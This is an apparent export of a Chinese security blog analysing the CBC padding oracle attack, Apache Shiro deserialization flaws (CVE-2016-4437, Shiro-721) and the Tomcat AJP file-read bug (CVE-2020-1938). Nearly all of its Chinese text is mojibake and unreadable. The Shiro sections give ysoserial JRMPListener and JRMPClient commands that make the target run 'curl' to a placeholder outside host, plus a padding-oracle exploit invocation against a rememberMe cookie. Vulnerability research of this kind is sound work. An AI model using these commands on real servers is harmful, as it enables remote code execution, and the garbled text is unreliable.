0x02Ê≠§Êó∂ÔºåÈÄöËøá‰øÆÊîπIVÁ¨¨ÂÖ´‰∏™Â≠óËäÇÁöÑÂÄº‰ΩøÂæóÊúÄÂêé‰∏Ä‰∏™padding‰ΩçÂèòÊàê0x02(‰∏äÂõæ‰∏≠0x67^0x02=0√ó64)ÔºåÂÜçfuzz IVÁ¨¨‰∏É‰∏™Â≠óËäÇÔºå‰ΩøÂæóÊúçÂä°Á´ØËß£Âá∫plaintextÂÖ∂Â°´ÂÖÖ‰Ωç‰∏∫0x02Ôºå‰ª•Ê≠§Á±ªÊé®„ÄÇ ÊÄªÁöÑÊù•ËØ¥ÔºåÂÖ∂ÂÆûÊîªÂáªÁöÑÊú¨Ë¥®ÈÉΩÊòØ‰∏∫‰∫ÜÂæóÂà∞‰∏≠Èó¥‰∏¥Êó∂ÂèòÈáèintermediary valueÔºåÈÄöËøáÂÖ∂ÂíåÂàùÂßãIVËÆ°ÁÆóÂá∫ÊòéÊñá„ÄÇ Â§öÂàÜÁªÑÂØÜÊñáÊÉÖÂÜµ‰∏äÈù¢ËØ¥Âà∞ÁöÑPadding Oracle AttackÊòØ‰ª•Âçï‰∏™ÂàÜÁªÑËøõË°åÁöÑÔºåÂ¶ÇÊûúÂØÜÊñáÊúâÂ§ö‰∏™ÂàÜÁªÑÔºåÂÖ∂ÊúÄÂ§ßÁöÑÂå∫Âà´Âú®‰∫éËøô‰∏ÄÂàÜÁªÑÂä†ÂØÜÁöÑÂàùÂßãIVÂêëÈáè‰∏∫‰∏äÊ¨°ÁªÑÂä†ÂØÜÁöÑÁªìÊûúCiphertext„ÄÇ Âú®Â§öÂàÜÁªÑÂØÜÊñá‰∏≠ÔºåÁî±‰∫éÂØÜÊñáÂíåIVÂ∑≤Áü•‰∏îÂèØÊéßÔºåÂÖàÊãøÁ¨¨‰∏ÄÁªÑpaddingÁöÑÊñπÂºèÁàÜÁ†¥IVÊé®ÁÆóintermediary valueÔºåÁÑ∂ÂêéÊ†πÊçÆÂéüÂßãIVËÆ°ÁÆóÂá∫ÊòéÊñáÔºå‰πüÂèØ‰ª•ÈÄöËøá‰øÆÊîπÂéüÂßãIVÊéßÂà∂ÂØÜÊñáÁªìÊûúÔºõÂÜçÊãøÁ¨¨‰∏Ä‰∫åÁªÑÔºåÁî®paddingÁöÑÊñπÂºèÁàÜÁ†¥intermediary valueÔºåÊ≠§Êó∂ÁöÑÂàùÂßãIV‰∏∫Á¨¨‰∏ÄÁªÑÁöÑÂØÜÊñáÔºå‰ª•Ê≠§Á±ªÊé®„ÄÇ Èò≤Âæ°ÊºèÊ¥ûÁöÑÂÖ≥ÈîÆÁÇπÂú®‰∫éÊîªÂáªËÄÖËÉΩÂ§üÂà§Êñ≠ÂÖ∂paddingÁöÑÁªìÊûúÔºåÂú®‰ΩøÁî®CBCÊ®°ÂºèÁöÑÂàÜÁªÑÂä†ÂØÜÁÆóÊ≥ïÈúÄË¶ÅÊ≥®ÊÑèËøô‰∏ÄÁÇπÔºåÊØîÂ¶ÇËÆ©ÊúçÂä°Á´ØÂä†‰∏äÂºÇÂ∏∏Â§ÑÁêÜÁ≠âÁ≠â„ÄÇ ÂÆûÈ™å‰ª£Á†ÅÔºöDemo CBCÂ≠óËäÇÂèçËΩ¨Âú®‰πå‰∫ëÁü•ËØÜÂ∫ìÈáåÊúâ‰∏ÄÁØáÊñáÁ´†ÁöÑ‰æãÂ≠êËØ¥ÁöÑÊØîËæÉÊ∏ÖÊô∞ÔºöCBCÂ≠óËäÇÁøªËΩ¨ÊîªÂáª-101ApproachÔºåÂÜçÊù•ÂèÇËÄÉctfwiki‰∏≠ÂØπCBCÊ®°ÂºèÁöÑ‰ªãÁªçÔºöÁÆÄÂçïÊù•ËØ¥ÔºåÈÄöËøáÊûÑÈÄ†Á¨¨nÁöÑÂØÜÊñáÂùó‰∏∫C(n) xor P(n+1) xor AÔºå‰ΩøÂæóÁ¨¨n+1ÂØÜÊñáÂùó‰∏∫A(‰∏™‰∫∫ËßâÂæóCTFWikiËøôÈáåÂÜôÈîô‰∫Ü)Ôºå‰∏∫‰ªÄ‰πàÂë¢Ôºü C(n) xor P(n+1)ÁöÑÁªìÊûúÂÆûÈôÖ‰∏äÂ∞±ÊòØÁ¨¨n+1ÁªÑÁöÑintermediary valueÔºåÂú®Ëß£ÂØÜÊó∂ËÆ©intermediary valueËá™Â∑±ÂºÇÊàñËá™Â∑±ÂæóÂÖ®0ÔºåÁÑ∂ÂêéÂÜçÂºÇÊàñAÂæóA„ÄÇÂ¶Ç‰∏ãÂõæÊâÄÁ§∫Ôºö ÁÆÄËÄåË®Ä‰πãÔºåÈÄöËøáÊçüÂùèÂØÜÊñáÂ≠óËäÇÊù•ÊîπÂèòÊòéÊñáÂ≠óËäÇÔºåÊîªÂáªÊù°‰ª∂‰∏∫Áü•ÈÅì‰∏ÄÁªÑÊòéÊñáÂíåÂØÜÊñá„ÄÇ CVE-2016-4437: Shiro ÂèçÂ∫èÂàóÂåñ(Shiro &lt;= 1.2.4)Apache ShiroÊòØ‰∏Ä‰∏™ÂºÄÊ∫êÂÆâÂÖ®Ê°ÜÊû∂ÔºåÊèê‰æõË∫´‰ªΩÈ™åËØÅ„ÄÅÊéàÊùÉ„ÄÅÂØÜÁ†ÅÂ≠¶Âíå‰ºöËØùÁÆ°ÁêÜ„ÄÇÂú®Apache Shiro &lt;= 1.2.4ÁâàÊú¨‰∏≠Â≠òÂú®ÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ ÁéØÂ¢ÉÊê≠Âª∫Âéªgithub‰∏ä‰∏ã‰∏Ä‰∏™shiro 1.2.4:123git clone https://github.com/apache/shiro.gitcd shirogit checkout shiro-root-1.2.4 ÁÑ∂Âêé‰øÆÊîπshiro/samples/web/pom.xml12345678910111213141516171819202122&lt;!-- ÈúÄË¶ÅËÆæÁΩÆÁºñËØëÁöÑÁâàÊú¨ --&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;!-- ËøôÈáåÈúÄË¶ÅÂ∞ÜjstlËÆæÁΩÆ‰∏∫1.2 --&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; ¬∑ &lt;!--Âä†‰∏Ä‰∏™gadget--&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt;&lt;dependencies&gt; ÁºñËØëÔºösudo mvn package ÁàÜ‰∫ÜËøôÊ†∑ÁöÑÈîôÔºöÂÖàÂæóÂéªÊêû‰∏™jdk1.6Êù•Ôºåmac‰∏ãÂºÉÁî®‰∫ÜÔºåÂèÇËÄÉËøôÁØáÊñáÁ´†Ôºöhttps://blog.csdn.net/q258523454/article/details/84029886ÔºåÂéªËøôÈáå‰∏ã[macÁöÑjdk1.6][6]„ÄÇ ÁÑ∂ÂêéÂàáÊç¢Âà∞rootÂàõ‰∏Ä‰∏™Êñá‰ª∂Ôºö/var/root/.m2/toolchains.xml12345678910111213141516&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;toolchains xmlns="https://maven.apache.org/TOOLCHAINS/1.1.0" xmlns:xsi="https://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="https://maven.apache.org/TOOLCHAINS/1.1.0 https://maven.apache.org/xsd/toolchains-1.1.0.xsd"&gt;&lt;!--ÊèíÂÖ•‰∏ãÈù¢‰ª£Á†Å--&gt; &lt;toolchain&gt; &lt;type&gt;jdk&lt;/type&gt; &lt;provides&gt; &lt;version&gt;1.6&lt;/version&gt; &lt;vendor&gt;sun&lt;/vendor&gt; &lt;/provides&gt; &lt;configuration&gt; &lt;!--ËøôÈáåÊòØ‰Ω†ÂÆâË£ÖjdkÁöÑÊñá‰ª∂ÁõÆÂΩï--&gt; &lt;jdkHome&gt;/Library/Java/JavaVirtualMachines/1.6.0.jdk/&lt;/jdkHome&gt; &lt;/configuration&gt; &lt;/toolchain&gt;&lt;/toolchains&gt; ÂÜçÁºñËØëÂ∞±ËÉΩÊàêÂäü‰∫ÜÔºö Â∞ÜËøô‰∏™warÂåÖÊîæÂà∞tomcatÁöÑwebappÁõÆÂΩï‰∏ãÔºåÁÑ∂ÂêéËÆøÈóÆhttps://127.0.0.1:8080/shiro/‰ºöËá™Âä®Ëß£ÂéãÔºösamples-web-1.2.4 ‰πüÂèØ‰ª•ÊääÂÆÉÂØºÂà∞ideaÈáåÊâìÂåÖÔºåÊé•ÁùÄÈÖçÁΩÆideaÔºåËøôÈáåË∏©‰∫ÜÂùëEDUÁâàÊú¨ÊòØÊ≤°Êúâtomcat serverÁöÑÔºå‰∏ÄÂÆöË¶ÅÁî®ÊóóËà∞ÁâàÔºö ÊºèÊ¥ûÂ§çÁé∞EXPÊâìysoserialÁöÑ‰∫åÈìæÔºöshiro1.2.4RCE ‰ª£Á†ÅÂàÜÊûêÂä†ÂØÜÂÖà‰∏ã‰∏™Êñ≠ÁÇπÔºöorg.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLoginÔºåÂéªlogin.jspÁôªÂΩïroot secretÔºåÈÄâ‰∏≠Remember Me„ÄÇÂú®forgetIdentityÂáΩÊï∞‰∏≠Â§ÑÁêÜ‰∫ÜrequestÂíåresponseËØ∑Ê±ÇÔºåÂú®response‰∏≠Â§ÑÁêÜremember meÁöÑcookie„ÄÇÂÜçË∑üËøõrememberIdentityÂáΩÊï∞ÔºöË∞ÉÁî®convertPrincipalsToBytesÂ∞ÜË¥¶Êà∑‰ø°ÊÅØ‰º†ÂÖ•ÔºåÂÖàÊòØËøõË°åÂ∫èÂàóÂåñÔºåÂÜçÊù•‰∏Ä‰∏™Âä†ÂØÜÔºöË∑üËøõencryptÂáΩÊï∞ÔºögetCipherServiceÂÖàËé∑Âèñ‰∫Ü‰∏Ä‰∏ãÂä†ÂØÜÊúçÂä°ÁöÑÈÖçÁΩÆ‰ø°ÊÅØÔºåÂåÖÊã¨Âä†ÂØÜÊ®°ÂºèÔºåÂ°´ÂÖÖÊñπÂºèÔºåÂä†ÂØÜÁ±ªÂûãÁ≠âÁ≠âÔºöcipherService.encryptÂÖ∂‰∏≠ÁßòÈí•Âú®AbstractRememberMeManager.java‰∏≠ËÆæÁΩÆÁöÑ‰∏Ä‰∏™ÂÆöÂÄºÔºöÈÄöËøáÊûÑÈÄ†ÊñπÊ≥ïËÆæÁΩÆÁöÑÔºö Âú®Âä†ÂØÜËøáÁ®ã‰∏≠ÈúÄË¶ÅÂÖ≥Ê≥®ÁöÑ‰∏Ä‰∏™ÁÇπÔºåÂ∞ÜivÂêëÈáèÊîæÁΩÆÂú®ÂØÜÊñáÂ§¥ÈÉ®Ôºöorg/apache/shiro/crypto/JcaCipherService.java Âä†ÂØÜÂÆåÊàêÂêéÔºåËøîÂõûÁªìÊûú‰º†ÂÖ•rememberSerializedIdentityÂáΩÊï∞ÔºåÂ§ÑÁêÜhttpËØ∑Ê±ÇÔºåËøîÂõûcookieÂà∞response‰∏≠Ôºö Âà∞ËøôÈáåcookieÂä†ÂØÜÂ§ÑÁêÜÂ∞±ÁªìÊùü‰∫ÜÔºåÂÜçÊù•Ë∑ü‰∏Ä‰∏ãÊòØÂ¶Ç‰ΩïËß£ÂØÜcookieÁöÑ„ÄÇ Ëß£ÂØÜorg/apache/shiro/mgt/AbstractRememberMeManager.java#getRememberedPrincipalsÂÖà‰ªégetRememberedSerializedIdentityÂáΩÊï∞Ëé∑ÂèñcookieÔºåbase64Ëß£Á†ÅÔºö ÁÑ∂ÂêéËøõÂÖ•convertBytesToPrincipalsÂáΩÊï∞ÔºåÂÖàÊòØËß£ÂØÜÔºåÊé•ÁùÄÂèçÂ∫èÂàóÂåñ ÂùëÁÇπÔºöÂèçÂ∫èÂàóÂåñÈôêÂà∂ÁΩë‰∏äÂ§ßÈÉ®ÂàÜÊñáÁ´†ÈÉΩÊòØÊãøcommon-collections2ËøôË∞ÉÈìæÊù•Â§çÁé∞ÔºåÁïÖÈÄöÊó†Èòª„ÄÇ Êàë‰ª¨Êù•ËØïËØïÂÖ∂‰ªñÈìæÔºåÊäägadgetÊç¢Êàêysoserial5ÊâìshiroËá™Â∏¶ÁöÑcommons-collections-3.2.1Ôºå‰ºöÊäõÂá∫ËøôÊ†∑‰∏Ä‰∏™ÈîôËØØÔºö ÂÜçÊääÂÖ∂ÁªÑ‰ª∂ÊãâÂá∫Êù•ÂçïÁã¨ËØïËØïÔºö Ë∞ÉËØïÂàÜÊûê‰∏Ä‰∏ãÔºöorg/apache/shiro/io/DefaultSerializer.javaË∑üËøõClassResolvingObjectInputStreamÁ±ªÔºöorg/apache/shiro/io/ClassResolvingObjectInputStream.java‰ªñÁªßÊâø‰∫ÜObjectInputStreamÁ±ªÔºåÈáçÂÜô‰∫ÜresolveClassÊñπÊ≥ïÔºåÂÜçÊù•Áúã‰∏Ä‰∏ãÂéüÁâàresolveClassÊñπÊ≥ïÔºö Class.forNameÂíåClassUtils.forNameÁöÑÂ∑ÆÂà´ÔºåÊù•ÁúãÁúãClassUtilsÂÖ∑‰ΩìÂÆûÁé∞Ôºöorg/apache/shiro/util/ClassUtils.java#forNameshiro‰∏çÊòØÂÉèÂéüÁâàÈÇ£Ê†∑ÈÄöËøájava.lang.ClassÂèçÂ∞ÑËé∑ÂèñclassÔºåËÄåÊòØÈÄöËøáParallelWebappClassLoaderÂéªÂä†ËΩΩclassÊü•‰∫Ü‰∏Ä‰∫õ‰∏ãËµÑÊñôÔºåÁúãÂà∞orangeÂ∏àÂÇÖÊñáÁ´†ËØÑËÆ∫‰∏≠ËØ¥‰∏çÊîØÊåÅË£ÖËΩΩÊï∞ÁªÑÁ±ªÂûãÔºåËøôÈáåÊ≤°ÁªÜË∑üÂéüÂõ†‰∫Ü„ÄÇ JRMPÁªïËøáOrangÂ∏àÂÇÖÂú®ÊñáÁ´†‰∏≠‰∏ÄÈ°øÊìç‰ΩúÔºåÂèëÁé∞JRMPÂèØ‰ª•ÈÅøÂºÄ‰∏äËø∞ÈôêÂà∂ÔºåÊµãËØï‰∏Ä‰∏ãÔºö serverÔºö1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'curl https://x.x.x.x:8989' client:1java -jar ysoserial.jar JRMPClient &apos;x.x.x.x:12345&apos; Á®çÂæÆË∞É‰∫Ü‰∏Ä‰∏ãEXP,Â§ßÊ¶ÇËÉΩË°åÁöÑÂéüÂõ†Â∞±ÊòØËµ∞ÁöÑËøúÁ®ãÁöÑclassÂä†ËΩΩÁöÑÔºåËÄå‰∏çÊòØÂÉè‰πãÂâçÈÇ£Ê†∑Áõ¥Êé•ÊâìÊú¨Âú∞Ôºö ‰∏çËøáÊúâ‰∏ÄÁÇπÊØîËæÉÂõ∞ÊÉëÔºåÁî®URLDNSÊâì‰∫ÜÊ≤°ÁªìÊûúÔºå‰ΩÜÊòØÁõ¥Êé•Áî®5ÈìæJRMPÊâìÂç¥ÂèØ‰ª•‚Ä¶ ËøôÈáåÊâãÂä®ËÜú@hu3skyÂ∏àÂÇÖÔºåÊïôÊàëÊâãÊåñÊó†Êï∞ÁªÑÁöÑgadgets ÊåñÊéò3.2.1Êó†Êï∞ÁªÑgadget ÂÖàÊåñÂùëÔºåÊåñÂà∞ÂÜçËØ¥Âêß Shiro Padding OracleÊîªÂáªÔºàShiro &lt;= 1.4.1ÔºâÊºèÊ¥ûÂ§çÁé∞EXPÁî®3ndz/Shiro-721ÔºåshiroÁöÑÁâàÊú¨1.4.1ÈÖçÁΩÆËøáÁ®ãÂèÇËÄÉ‰∏äÊñá„ÄÇ ysoÁîüÊàê‰∏™jrmpclientÔºö1java -jar ysoserial.jar JRMPClient &apos;x.x.x.x:12345&apos; &gt; JRMPClient ÊúçÂä°Á´ØËµ∑‰∏Ä‰∏™jrmplistener1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections2 &apos;curl https://x.x.x.x:8989&apos; 1python2 shiro_padding_oracle.py https://127.0.0.1:8088/samples_web_war_exploded/index.jsp [rememberMeÁöÑcookie] JRMPClien ÊºèÊ¥ûÂàÜÊûêÂÖàÊù•ÁúãÁúãËøô‰∏™ÁâàÊú¨ÂØπÁßòÈí•ÁöÑÂ§ÑÁêÜÔºöorg/apache/shiro/mgt/AbstractRememberMeManager.java ‰∏ÄÁõ¥Ë∑üËøõÔºåÂèØ‰ª•ÁúãÂà∞Â∞Ü‰πãÂâçÁöÑÁ°¨ÁºñÁ†ÅÁßòÈí•Êç¢Êàê‰∫ÜÂä®ÊÄÅÁîüÊàêÔºö paddingÈîôËØØÂú®Êàë‰ª¨ÁªôrememberMeËæìÂÖ•ÈîôËØØÁöÑpaddingÂêéÔºåÁªèËøá‰∏äÊñáÊèêÂà∞ÁöÑËß£ÂØÜËøáÁ®ãÂêéÔºå‰ºöÊäõÂá∫ÂºÇÂ∏∏:/org/apache/shiro/crypto/JcaCipherService.classÁÑ∂ÂêéÂú®org/apache/shiro/mgt/AbstractRememberMeManager.java#getRememberedPrincipalsÊçïËé∑ ÊúÄÂêéÂú®org/apache/shiro/web/servlet/SimpleCookie.java‰∏≠ÁªôËøîÂõûÂåÖËÆæÁΩÆ‰∏Ä‰∏™rememberMeÁöÑcookieÔºåË¶ÜÁõñÊéâ‰πãÂâçÁöÑÂÄºÔºö Ë∞ÉÁî®Ê†àÔºö paddingÊ≠£Á°ÆÔºåÂèçÂ∫èÂàóÂåñÈîôËØØÂú®‰πãÂâçÁöÑpadding oracleÊºèÊ¥û‰∏≠Ôºå‰æùÈù†ÊéßÂà∂Ââç‰∏ÄÂùóÂØÜÊñáÊù•‰º™ÈÄ†Âêé‰∏ÄÂùóÁöÑÊòéÊñáÔºåÊ†πÊçÆPaddingÁöÑÊú∫Âà∂ÔºåÂèØÊûÑÈÄ†Âá∫‰∏Ä‰∏™boolÊù°‰ª∂Ôºå‰ªéËÄåÈÄê‰ΩçÂæóÂà∞ÊòéÊñáÔºåÁÑ∂ÂêéÈÄêÂùóÂæóÂà∞ÊâÄÊúâÊòéÊñá„ÄÇ ‰πüÂ∞±ÊòØËØ¥ÈÄöËøápaddingËé∑ÂèñÊù•‰º™ÈÄ†ÊòéÊñáÁöÑÔºå‰ºöÊîπÂèòÂâç‰∏ÄÂùóÁöÑÂØÜÊñáÔºå‰πüÂ∞±ÊòØ‰ºöÂΩ±ÂìçÂà∞Ëß£ÂØÜÁöÑÁªìÊûú„ÄÇÊàë‰ª¨Êù•Áúãshiro‰∏≠ÂØπ‰∫éËß£ÂØÜÁªìÊûúÁöÑÂ§ÑÁêÜÔºåÂú®DefaultSerializer.class‰∏≠ËøõË°åÂèçÂ∫èÂàóÂåñÊó∂Ôºå‰ºöÂ§±Ë¥•ËÄåÊäõÂá∫ÂºÇÂ∏∏ÔºöËÄåÂØπ‰∫éÂÆ¢Êà∑Á´ØËÄåË®ÄÔºåÁªìÊûúÊòØ‰∏ÄÊ†∑ÁöÑÔºåÈÉΩËµ∞Âà∞‰∫ÜAbstractRememberMeManager.javaÁöÑÂºÇÂ∏∏Â§ÑÁêÜÔºöÊé•ÁùÄÂ∞±ÊòØÁªôÂÆ¢Êà∑Á´ØÈáçÁΩÆrememberMeÁöÑcookie„ÄÇ ÊãºÊé•Â∫èÂàóÂåñÊï∞ÊçÆÂú®gyyy:ÊµÖÊûêJavaÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñËøôÁØáÊñáÁ´†‰∏≠‰ªãÁªç‰∫ÜjavaÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÁöÑÊú∫Âà∂ÔºåÂÖ≥ÈîÆÁÇπÂú®‰∫éObjectOutputStreamÊòØ‰∏Ä‰∏™StreamÔºå‰ªñ‰ºöÊåâÊ†ºÂºè‰ª•ÈòüÂàóÊñπÂºèËØª‰∏ãÂéªÔºåÂêéÈù¢ÊãºÊé•Êó†ÂÖ≥ÂÜÖÂÆπÔºå‰∏ç‰ºöÂΩ±ÂìçÂèçÂ∫èÂàóÂåñ„ÄÇ ÊâÄ‰ª•Áé∞Âú®BOOLÊù°‰ª∂Â∞±Âá∫Êù•‰∫ÜÔºåÊãºÊé•Êó†ÂÖ≥Êï∞ÊçÆÔºåpadding Ê≠£Á°ÆÔºåËÉΩÊ≠£Â∏∏ÂèçÂ∫èÂàóÂåñÔºåpaddingÈîôËØØÊäõÂá∫ÂºÇÂ∏∏„ÄÇ ÊúÄÂêépayloadÁöÑÊûÑÈÄ†Â∞±ÊòØ‰∏çÊñ≠ÁöÑÁî®‰∏§‰∏™blockÂéªpaddingÂæóÂà∞intermediary‰πãÂêéÔºåÊûÑÈÄ†ÂØÜÊñá‰ΩøÂæóËß£ÂØÜÂêéÂæóÂà∞ÊåáÂÆöÊòéÊñáÔºåÊúÄÂêéÊãºÊé•Âà∞ÂéüÊúâÁöÑcookie‰∏ä„ÄÇ exp: https://github.com/3ndz/Shiro-721 ÊúÄÂêéËøôÊÆµÊó∂Èó¥‰ªéÂØÜÁ†ÅÂ≠¶Âà∞shiroÂèçÂ∫èÂàóÂåñÁöÑÂá†‰∏™ÁâàÊú¨ÊºèÊ¥ûÂàÜÊûêÔºåÁÆóÊ≥ïÂäüÂ∫ïËøòÂæóÂä†Âº∫ÔºåÊé•‰∏ãÊù•ÁöÑÊó∂Èó¥Á†îÁ©∂‰∏Ä‰∏ãshiroÂèçÂ∫èÂàóÂåñRCEÁöÑÂõûÊòæÈóÆÈ¢ò„ÄÇ ÂèÇËÄÉÊñáÁ´†Ôºö ÂàÜÊûêË∞ÉËØïapache shiroÂèçÂ∫èÂàóÂåñÊºèÊ¥û(CVE-2016-4437) „ÄêÊºèÊ¥ûÂàÜÊûê„ÄëShiro RememberMe 1.2.4 ÂèçÂ∫èÂàóÂåñÂØºËá¥ÁöÑÂëΩ‰ª§ÊâßË°åÊºèÊ¥û pwn-ctf-platform-with-java-jrmp-gadget Exploiting JVM deserialization vulns despite a broken class loader Shiro 721 Padding OracleÊîªÂáªÊºèÊ¥ûÂàÜÊûê p0:Shiro Padding Oracle Attack ÂèçÂ∫èÂàóÂåñ]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ÊºèÊ¥ûÂàÜÊûê</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcat-Ajp ÂçèËÆÆÊºèÊ¥ûÂàÜÊûê(CVE-2020-1938)]]></title>
    <url>%2F2020%2F03%2F02%2FTomcat-Ajp%20%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2020-1938)%2F</url>
    <content type="text"><![CDATA[TomcatÊòØÁî±ApacheËΩØ‰ª∂Âü∫Èáë‰ºöÂ±û‰∏ãJakartaÈ°πÁõÆÂºÄÂèëÁöÑServletÂÆπÂô®ÔºåÊåâÁÖßSun MicrosystemsÊèê‰æõÁöÑÊäÄÊúØËßÑËåÉÔºåÂÆûÁé∞‰∫ÜÂØπServletÂíåJavaServer PageÔºàJSPÔºâÁöÑÊîØÊåÅ„ÄÇÁî±‰∫éTomcatÊú¨Ë∫´‰πüÂÜÖÂê´‰∫ÜHTTPÊúçÂä°Âô®ÔºåÂõ†Ê≠§‰πüÂèØ‰ª•ËßÜ‰ΩúÂçïÁã¨ÁöÑWebÊúçÂä°Âô®„ÄÇ ÊºèÊ¥ûÂΩ±ÂìçËØ•ÊºèÊ¥ûÂèØ‰ª•Áî®Êù•ËØªÂèñÊàñÂåÖÂê´ Tomcat ‰∏äÊâÄÊúâ webappÁõÆÂΩï‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂ÔºåÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÂΩ±Âìç‰ª•‰∏ãÁâàÊú¨Ôºö Apache Tomcat 9.x &lt; 9.0.31 Apache Tomcat 8.x &lt; 8.5.51 Apache Tomcat 7.x &lt; 7.0.100 Apache Tomcat 6.x ÁéØÂ¢ÉÊê≠Âª∫ÊµãËØïÁâàÊú¨8.5.16ÔºåÁî®ÁöÑmac‰∏ãMxsrvsËá™Â∏¶ÁöÑtomcat„ÄÇÂú®/bin/catalina.shÊñá‰ª∂Â§¥ÈÉ®ÈáåÂ¢ûÂä†‰∏ÄË°åÔºåËÆæÁΩÆË∞ÉËØïÁ´ØÂè£Ôºö1export JPDA_ADDRESS=9901 ÂÜç‰øÆÊîπ‰∏Ä‰∏ãstartup.shÁöÑÊúÄÂêé‰∏ÄË°å:12#exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; start &quot;$@&quot;exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; jpda start &quot;$@&quot; IdeaÈáåÈÖçÁΩÆ‰∏Ä‰∏ã ÊºèÊ¥ûÂ§çÁé∞EXPÔºö https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi ÊºèÊ¥ûÂàÜÊûêÊú¨Âú∞ÊµãËØï8.5.16ÁâàÊú¨ÔºåtomcatÈªòËÆ§ÂºÄÂêØ‰∏â‰∏™Á´ØÂè£ÔºöÂú®/conf/server.xml‰∏≠ÈÖçÁΩÆÔºö TomcatÊúçÂä°Âô®ÈÄöËøáConnectorËøûÊé•Âô®ÁªÑ‰ª∂‰∏éÂÆ¢Êà∑Á®ãÂ∫èÂª∫Á´ãËøûÊé•ÔºåconnectorÁªÑ‰ª∂Ë¥üË¥£Êé•Êî∂ÂÆ¢Êà∑ÁöÑËØ∑Ê±ÇÔºå‰ª•ÂèäÊääTomcatÊúçÂä°Âô®ÁöÑÂìçÂ∫îÁªìÊûúÂèëÈÄÅÁªôÂÆ¢Êà∑„ÄÇ Âú®‰∏äÂõæÁöÑÈÖçÁΩÆ‰∏≠Êúâ‰∏§‰∏™connectÔºåÂç≥8080Á´ØÂè£ÂØπÂ∫îÁùÄHttp ConnectorÔºå‰ΩøÁî®httpÔºàHTTP/1.1ÔºâÂçèËÆÆÔºõ8009‰ΩøÁî®ÁöÑAJP ConnectorÔºå‰ΩøÁî®ÁöÑÊòØ AJP ÂçèËÆÆÔºàApache Jserv ProtocolÔºâÊòØÂÆöÂêëÂåÖÂçèËÆÆ„ÄÇÂõ†‰∏∫ÊÄßËÉΩÂéüÂõ†Ôºå‰ΩøÁî®‰∫åËøõÂà∂Ê†ºÂºèÊù•‰º†ËæìÂèØËØªÊÄßÊñáÊú¨ÔºåÂÆÉËÉΩÈôç‰Ωé HTTP ËØ∑Ê±ÇÁöÑÂ§ÑÁêÜÊàêÊú¨ÔºåÂõ†Ê≠§‰∏ªË¶ÅÂú®ÈúÄË¶ÅÈõÜÁæ§„ÄÅÂèçÂêë‰ª£ÁêÜÁöÑÂú∫ÊôØË¢´‰ΩøÁî®„ÄÇÊõ¥ËØ¶ÁªÜÁöÑ‰ªãÁªçÂèØ‰ª•ÂèÇËÄÉ‰∏Ä‰∏ãAJPÂçèËÆÆÁöÑÂÆòÊñπÊñáÊ°£:The Apache Tomcat Connectors - AJP Protocol Reference WebÂÆ¢Êà∑ËÆøÈóÆÁöÑ‰∏§ÁßçÊñπÂºèÔºö ‰ª£Á†ÅÂàÜÊûêÈÖçÁΩÆideaÁöÑÊó∂ÂÄôÂÖà‰∏ã‰∏™Ê∫êÁ†ÅÔºöhttps://repo1.maven.org/maven2/org/apache/tomcat/tomcat-coyote/8.5.16/tomcat-coyote-8.5.16-sources.jar tomcat-coyote.jar!/org/apache/coyote/ajp/AjpProcessor.class#prepareRequestÂú®AJPÂçèËÆÆÁöÑËØ∑Ê±ÇÁªìÊûÑ‰∏≠ÊúâËøôÊ†∑‰∏Ä‰∏™Â≠óÊÆµÂ±ûÊÄßattributesÔºöÂØπÂ∫î‰∏äÊñá‰ª£Á†Å‰∏≠switch case‰∏≠ÁöÑÂåπÈÖçÈ°πÔºåË∑üËøõConstants.SC_A_REQ_ATTRIBUTEÔºö/org/apache/coyote/ajp/Constants.javaËøôÈáåÂÆö‰πâ‰∫ÜÊâÄÊúâÂ±ûÊÄßÔºåConstants.SC_A_REQ_ATTRIBUTEËøô‰∏™caseÂú®ÊñáÊ°£‰∏≠ÂØπÂ∫îreq_attributeÂ±ûÊÄßÔºåÊÑèÊÄùÊòØËØ¥ÔºåÂ¶ÇÊûúË¶ÅÂèëË∂ÖÂá∫‰∏äËø∞Âü∫Á°ÄÂ±ûÊÄß‰ª•Â§ñÁöÑÂÄºÔºåÈÉΩÂèØ‰ª•ÈÄöËøáreq_attribute(0X0A)Êù•ËÆæÁΩÆÂÖ∂Â±ûÊÄßÂêçÂíåÂÄºÊù•ÂèëÈÄÅ„ÄÇ‰∏çÈöæÁêÜËß£Ôºå‰πüÂ∞±ÂØπÂ∫îÁùÄËøôÈáåÁöÑÂ§ÑÁêÜÈÄªËæëÔºåÂ¶ÇÊûúÊòØÂú®‰∏äËø∞‰πãÂ§ñÂ±ûÊÄßÔºåÂàôÂÖÅËÆ∏Êàë‰ª¨Ëá™ÂÆö‰πâÔºö 